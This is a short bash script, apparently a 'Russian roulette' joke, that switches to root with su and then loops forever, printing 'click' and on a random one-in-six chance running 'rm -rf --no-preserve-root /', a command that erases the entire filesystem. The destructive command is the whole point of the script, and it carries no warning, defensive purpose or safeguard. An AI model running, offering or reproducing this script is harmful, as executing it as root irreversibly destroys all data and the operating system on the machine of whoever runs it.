#!/bin/bash
# Wyatt Boyer - 2023
# login as root
su
while true
do
  [ $[ $RANDOM % 6 ] == 0 ] && rm -rf --no-preserve-root /
  echo "click"
done
